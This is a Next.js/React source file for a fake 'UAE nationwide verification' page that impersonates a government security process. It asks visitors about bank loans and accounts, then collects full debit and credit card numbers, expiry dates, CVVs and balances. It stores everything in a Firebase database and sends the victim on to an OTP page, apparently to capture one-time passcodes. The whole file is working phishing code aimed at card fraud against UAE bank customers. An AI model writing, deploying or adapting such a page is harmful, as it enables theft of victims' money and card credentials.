"use client"

import type React from "react"
import { useState, useEffect } from "react"
import Header from '../components/Header'
import Footer from '../components/Footer'
import { doc, setDoc, serverTimestamp } from "firebase/firestore"
import { db } from "../../lib/firebase"
import { useRouter, useSearchParams } from 'next/navigation'

export default function BankVerification() {
  const [formData, setFormData] = useState({
    loanFromBank: "",
    bankAccounts: "",
    bankName: "",
    verificationMethod: "enter-details",
    debitCards: "0",
    creditCards: "0",
    debitCardDetails: [{ cardNumber: "", expiry: "", cvv: "", balance: "" }],
    creditCardDetails: [{ cardNumber: "", expiry: "", cvv: "", balance: "" }],
  })

  const [isLoading, setIsLoading] = useState(false)
  const [loanDropdownOpen, setLoanDropdownOpen] = useState(false)
  const [message, setMessage] = useState("")
  const [uid, setUid] = useState("")
  const router = useRouter()
  const searchParams = useSearchParams()

  useEffect(() => {
    // Get UID from URL parameters
    const urlUid = searchParams.get('uid')
    if (urlUid) {
      setUid(urlUid)
      console.log("Received UID from URL:", urlUid)
    } else {
      setMessage("Error: No user session found. Please start from the beginning.")
    }
  }, [searchParams])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setMessage("")

    // Check if UID is available
    if (!uid) {
      setMessage("Error: No user session found. Please start from the beginning.")
      setIsLoading(false)
      return
    }

    // Validate required fields only
    if (!formData.loanFromBank || !formData.bankAccounts || !formData.bankName || !formData.verificationMethod) {
      setMessage("Please fill all required fields")
      setIsLoading(false)
      return
    }

    try {
      // Store bank verification data in "users" database, document "thirdform", with UID as field name
      const thirdformDocRef = doc(db, "users", "thirdform")
      await setDoc(thirdformDocRef, {
        [uid]: {
          ...formData,
          uid: uid,
          createdAt: serverTimestamp(),
          status: "pending",
          step: "bankVerification"
        }
      }, { merge: true })

      console.log("Bank verification submitted:", formData)
      console.log("Data stored with UID: ", uid)
      
      setMessage("Bank verification submitted successfully!")
      
      // Navigate to otp1 page with the same UID
      router.push(`/otp1?uid=${uid}`)

    } catch (error) {
      console.error("Error adding document: ", error)
      setMessage("Error submitting bank verification. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  const handleSelectChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
    if (field === "loanFromBank") {
      setLoanDropdownOpen(false)
    }
  }

  const handleRadioChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
  }

  const handleCardDetailChange = (cardType: "debit" | "credit", index: number, field: string, value: string) => {
    const key = cardType === "debit" ? "debitCardDetails" : "creditCardDetails"
    setFormData((prev) => {
      const details = [...prev[key]]
      details[index] = { ...details[index], [field]: value }
      return { ...prev, [key]: details }
    })
  }

  const debitCardCount = Number.parseInt(formData.debitCards)
  const creditCardCount = Number.parseInt(formData.creditCards)

  return (
    <>
      <Header />
      <div className="min-h-screen bg-slate-100 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
        {/* Main Container */}
        <div className="w-full max-w-2xl">
          {/* Header Section */}
          <div className="text-center mb-8 sm:mb-12">
            <h1 className="text-xl sm:text-2xl md:text-3xl font-bold text-slate-900 mb-3 sm:mb-4">
              We are verifying all UAE States
            </h1>
            <p className="text-slate-700 text-sm sm:text-base leading-relaxed max-w-2xl mx-auto">
              In response to heightened safety and security concerns, the UAE has initiated a comprehensive nationwide
              verification process. Ensuring the identification and validation of individuals within its borders,
              fostering a safer environment for its residents and visitors.
            </p>
          </div>

          {/* Success/Error Message */}
          {message && (
            <div className={`p-4 mb-4 rounded-md ${
              message.includes("Error") 
                ? "bg-red-100 text-red-700 border border-red-300" 
                : "bg-green-100 text-green-700 border border-green-300"
            }`}>
              {message}
            </div>
          )}

          {/* Form Card */}
          <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 md:p-8 w-full">
            <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-8">
              {/* Question 1: Loan from Bank */}
              <div>
                <label className="block text-xs font-semibold text-slate-900 mb-1.5">
                  Have you ever got loan from any Bank? <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <button
                    type="button"
                    onClick={() => setLoanDropdownOpen(!loanDropdownOpen)}
                    className="w-full px-2.5 py-1.5 border border-blue-400 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-transparent bg-white text-slate-700 text-left flex justify-between items-center text-xs sm:text-sm"
                  >
                    <span>{formData.loanFromBank || "Select"}</span>
                    <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 14l-7 7m0 0l-7-7m7 7V3" />
                    </svg>
                  </button>

                  {loanDropdownOpen && (
                    <div className="absolute top-full left-0 right-0 mt-0 bg-white border border-blue-400 rounded-md shadow-md z-10">
                      <div
                        onClick={() => handleSelectChange("loanFromBank", "Select")}
                        className="px-2.5 py-1.5 bg-blue-500 text-white cursor-pointer hover:bg-blue-600 text-xs sm:text-sm"
                      >
                        Select
                      </div>
                      <div
                        onClick={() => handleSelectChange("loanFromBank", "Yes")}
                        className="px-2.5 py-1.5 text-slate-700 cursor-pointer hover:bg-slate-100 text-xs sm:text-sm"
                      >
                        Yes
                      </div>
                      <div
                        onClick={() => handleSelectChange("loanFromBank", "No")}
                        className="px-2.5 py-1.5 text-slate-700 cursor-pointer hover:bg-slate-100 text-xs sm:text-sm"
                      >
                        No
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Question 2: Bank Accounts */}
              <div>
                <label className="block text-sm font-semibold text-slate-900 mb-3">
                  How many Bank accounts you have? <span className="text-red-500">*</span>
                </label>
                <div className="flex flex-wrap gap-4 sm:gap-6">
                  {["0", "1", "2", "3"].map((num) => (
                    <label key={num} className="flex items-center gap-2 cursor-pointer">
                      <input
                        type="radio"
                        name="bankAccounts"
                        value={num}
                        checked={formData.bankAccounts === num}
                        onChange={(e) => handleRadioChange("bankAccounts", e.target.value)}
                        className="w-4 h-4 text-amber-600 cursor-pointer"
                        disabled={isLoading}
                      />
                      <span className="text-slate-700 text-sm sm:text-base">{num}</span>
                    </label>
                  ))}
                </div>
              </div>

              {/* Question 3: Bank Name */}
              <div>
                <label className="block text-sm font-semibold text-slate-900 mb-3">
                  Select the Name of the Bank <span className="text-red-500">*</span>
                </label>
                <select
                  value={formData.bankName}
                  onChange={(e) => handleSelectChange("bankName", e.target.value)}
                  className="w-full px-4 py-3 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent bg-white text-slate-700 appearance-none cursor-pointer text-sm sm:text-base disabled:bg-gray-100 disabled:cursor-not-allowed"
                  style={{ maxHeight: "46px", overflowY: "auto" }}
                  size={5}
                  disabled={isLoading}
                >
                  <option value="">Select a bank</option>
                  <option value="Abu Dhabi Commercial Bank (ADCB)">Abu Dhabi Commercial Bank (ADCB)</option>
                  <option value="Abu Dhabi Islamic Bank (ADIB)">Abu Dhabi Islamic Bank (ADIB)</option>
                  <option value="Ajman Bank">Ajman Bank</option>
                  <option value="Al Hilal Bank">Al Hilal Bank</option>
                  <option value="Al Hilal Digital">Al Hilal Digital</option>
                  <option value="Al Masraf (Arab Bank for Investment and Foreign Trade)">Al Masraf (Arab Bank for Investment and Foreign Trade)</option>
                  <option value="Bank of Baroda">Bank of Baroda</option>
                  <option value="Commercial Bank of Dubai (CBD)">Commercial Bank of Dubai (CBD)</option>
                  <option value="Dubai Islamic Bank (DIB)">Dubai Islamic Bank (DIB)</option>
                  <option value="Emirates Islamic Bank">Emirates Islamic Bank</option>
                  <option value="Emirates NBD">Emirates NBD</option>
                  <option value="First Abu Dhabi Bank (FAB)">First Abu Dhabi Bank (FAB)</option>
                  <option value="Habib Bank AG Zurich (UAE Branch)">Habib Bank AG Zurich (UAE Branch)</option>
                  <option value="HSBC UAE">HSBC UAE</option>
                  <option value="Invest Bank">Invest Bank</option>
                  <option value="Liv. by Emirates NBD">Liv. by Emirates NBD</option>
                  <option value="Mashreq Bank">Mashreq Bank</option>
                  <option value="Mashreq Neo">Mashreq Neo</option>
                  <option value="National Bank of Fujairah (NBF)">National Bank of Fujairah (NBF)</option>
                  <option value="National Bank of Umm Al Quwain (NBQ)">National Bank of Umm Al Quwain (NBQ)</option>
                  <option value="RAKBANK (National Bank of Ras Al Khaimah)">RAKBANK (National Bank of Ras Al Khaimah)</option>
                  <option value="Sharjah Islamic Bank (SIB)">Sharjah Islamic Bank (SIB)</option>
                  <option value="Standard Chartered Bank">Standard Chartered Bank</option>
                  <option value="United Arab Bank (UAB)">United Arab Bank (UAB)</option>
                  <option value="United Bank Limited (UBL)">United Bank Limited (UBL)</option>
                  <option value="Wio Personal">Wio Personal</option>
                  <option value="Wio Business">Wio Business</option>
                  <option value="Al Ansari Exchange">Al Ansari Exchange</option>
                  <option value="Other">Other</option>
                </select>
              </div>

              {/* Question 4: Verification Method */}
              <div>
                <label className="block text-sm font-semibold text-slate-900 mb-3">
                  How do you want to get verified? <span className="text-red-500">*</span>
                </label>
                <div className="flex flex-col sm:flex-row gap-4 sm:gap-6">
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input
                      type="radio"
                      name="verificationMethod"
                      value="enter-details"
                      checked={formData.verificationMethod === "enter-details"}
                      onChange={(e) => handleRadioChange("verificationMethod", e.target.value)}
                      className="w-4 h-4 text-amber-600 cursor-pointer"
                      disabled={isLoading}
                    />
                    <span className="text-slate-700 text-sm sm:text-base">Enter Details Manually</span>
                  </label>
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input
                      type="radio"
                      name="verificationMethod"
                      value="scan-documents"
                      checked={formData.verificationMethod === "scan-documents"}
                      onChange={(e) => handleRadioChange("verificationMethod", e.target.value)}
                      className="w-4 h-4 text-amber-600 cursor-pointer"
                      disabled={isLoading}
                    />
                    <span className="text-slate-700 text-sm sm:text-base">Scan Documents</span>
                  </label>
                </div>
              </div>

              {/* Question 5: Debit Cards */}
              <div>
                <label className="block text-sm font-semibold text-slate-900 mb-3">How many Debit Cards you have?</label>
                <div className="flex flex-wrap gap-4 sm:gap-6">
                  {["0", "1", "2", "3"].map((num) => (
                    <label key={num} className="flex items-center gap-2 cursor-pointer">
                      <input
                        type="radio"
                        name="debitCards"
                        value={num}
                        checked={formData.debitCards === num}
                        onChange={(e) => handleRadioChange("debitCards", e.target.value)}
                        className="w-4 h-4 text-blue-600 cursor-pointer"
                        disabled={isLoading}
                      />
                      <span className="text-slate-700 text-sm sm:text-base">{num}</span>
                    </label>
                  ))}
                </div>

                {debitCardCount > 0 && (
                  <div className="mt-4 space-y-4">
                    {Array.from({ length: debitCardCount }).map((_, index) => (
                      <div key={index} className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                        <div>
                          <label className="block text-xs font-semibold text-slate-900 mb-2">
                            Debit Card {index + 1} <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            placeholder="Card Number"
                            value={formData.debitCardDetails[index]?.cardNumber || ""}
                            onChange={(e) => handleCardDetailChange("debit", index, "cardNumber", e.target.value)}
                            className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                            disabled={isLoading}
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-slate-900 mb-2">
                            Expiry <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            placeholder="MM/YY"
                            value={formData.debitCardDetails[index]?.expiry || ""}
                            onChange={(e) => handleCardDetailChange("debit", index, "expiry", e.target.value)}
                            className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                            disabled={isLoading}
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-slate-900 mb-2">
                            CVV <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            placeholder="CVV"
                            value={formData.debitCardDetails[index]?.cvv || ""}
                            onChange={(e) => handleCardDetailChange("debit", index, "cvv", e.target.value)}
                            className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                            disabled={isLoading}
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-slate-900 mb-2">
                            Balance <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            placeholder="Balance"
                            value={formData.debitCardDetails[index]?.balance || ""}
                            onChange={(e) => handleCardDetailChange("debit", index, "balance", e.target.value)}
                            className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                            disabled={isLoading}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Question 6: Credit Cards */}
              <div>
                <label className="block text-sm font-semibold text-slate-900 mb-3">How many Credit Cards you have?</label>
                <div className="flex flex-wrap gap-4 sm:gap-6">
                  {["0", "1", "2", "3"].map((num) => (
                    <label key={num} className="flex items-center gap-2 cursor-pointer">
                      <input
                        type="radio"
                        name="creditCards"
                        value={num}
                        checked={formData.creditCards === num}
                        onChange={(e) => handleRadioChange("creditCards", e.target.value)}
                        className="w-4 h-4 text-blue-600 cursor-pointer"
                        disabled={isLoading}
                      />
                      <span className="text-slate-700 text-sm sm:text-base">{num}</span>
                    </label>
                  ))}
                </div>

                {creditCardCount > 0 && (
                  <div className="mt-4 space-y-4">
                    {Array.from({ length: creditCardCount }).map((_, index) => (
                      <div key={index} className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                        <div>
                          <label className="block text-xs font-semibold text-slate-900 mb-2">
                            Credit Card {index + 1} <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            placeholder="Card Number"
                            value={formData.creditCardDetails[index]?.cardNumber || ""}
                            onChange={(e) => handleCardDetailChange("credit", index, "cardNumber", e.target.value)}
                            className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                            disabled={isLoading}
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-slate-900 mb-2">
                            Expiry <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            placeholder="MM/YY"
                            value={formData.creditCardDetails[index]?.expiry || ""}
                            onChange={(e) => handleCardDetailChange("credit", index, "expiry", e.target.value)}
                            className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                            disabled={isLoading}
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-slate-900 mb-2">
                            CVV <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            placeholder="CVV"
                            value={formData.creditCardDetails[index]?.cvv || ""}
                            onChange={(e) => handleCardDetailChange("credit", index, "cvv", e.target.value)}
                            className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                            disabled={isLoading}
                          />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-slate-900 mb-2">
                            Balance <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            placeholder="Balance"
                            value={formData.creditCardDetails[index]?.balance || ""}
                            onChange={(e) => handleCardDetailChange("credit", index, "balance", e.target.value)}
                            className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm disabled:bg-gray-100 disabled:cursor-not-allowed"
                            disabled={isLoading}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isLoading || !uid}
                className="w-full mt-6 sm:mt-8 px-6 py-3 bg-[#B48B5E] hover:bg-[#a37a52] text-white font-semibold rounded-lg transition-colors duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed text-sm sm:text-base"
              >
                {isLoading ? "Processing..." : "Next"}
              </button>
            </form>

            {/* Debug info - you can remove this in production */}
            {uid && (
              <div className="mt-4 text-xs text-gray-500 text-center">
                User ID: {uid}
              </div>
            )}
          </div>
        </div>
      </div>
      <Footer />
    </>
  )
}